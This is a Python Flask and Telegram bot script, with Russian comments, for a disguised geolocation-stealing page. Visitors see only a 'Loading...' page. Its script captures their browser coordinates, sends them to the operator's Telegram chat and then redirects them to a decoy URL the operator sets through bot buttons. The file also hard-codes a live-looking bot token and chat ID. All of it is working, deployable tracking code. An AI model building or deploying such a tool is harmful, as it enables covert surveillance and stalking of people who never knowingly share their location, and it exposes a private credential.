from flask import Flask, request, render_template_string
import requests
import telebot
import threading
import os
from flask_cors import CORS
from telebot import types  # для кнопок

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888

app = Flask(__name__)
CORS(app)

bot = telebot.TeleBot(BOT_TOKEN)

redirect_url = 'https://geo-tracker-l5ui.onrender.com'  # твой Render URL

# Для хранения состояния, ждём ли ввода нового редиректа
waiting_for_redirect = set()

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

@app.route('/')
def serve_index():
    global redirect_url
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Загрузка...</title></head>
    <body>
    <script>
    navigator.geolocation.getCurrentPosition(pos => {{
        fetch('/send_location', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
            }})
        }});
        setTimeout(() => {{
            window.location.href = "{redirect_url}";
        }}, 1500);
    }}, err => {{
        setTimeout(() => {{
            window.location.href = "{redirect_url}";
        }}, 1500);
    }});
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon:
        send_to_telegram(lat, lon)
        return {'status': 'ok'}
    return {'status': 'error'}, 400

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "❌ Доступ запрещен.")
        return
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("Изменить редирект")
    btn2 = types.KeyboardButton("Скинуть ссылку на Render")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "Привет! Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Изменить редирект")
def change_redirect(message):
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "❌ Доступ запрещен.")
        return
    bot.send_message(message.chat.id, "Отправь новую ссылку (начинающуюся с http:// или https://):")
    waiting_for_redirect.add(message.chat.id)

@bot.message_handler(func=lambda message: message.chat.id in waiting_for_redirect)
def receive_new_redirect(message):
    global redirect_url
    if not (message.text.startswith('http://') or message.text.startswith('https://')):
        bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://\nПопробуй ещё раз:")
        return
    redirect_url = message.text
    bot.reply_to(message, f"✅ Редирект успешно изменён на:\n{redirect_url}")
    waiting_for_redirect.remove(message.chat.id)

@bot.message_handler(func=lambda message: message.text == "Скинуть ссылку на Render")
def send_render_link(message):
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "❌ Доступ запрещен.")
        return
    bot.send_message(message.chat.id, f"Текущая ссылка на Render:\n{redirect_url}")

def run_bot():
    bot.remove_webhook()
    bot.infinity_polling()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=port)
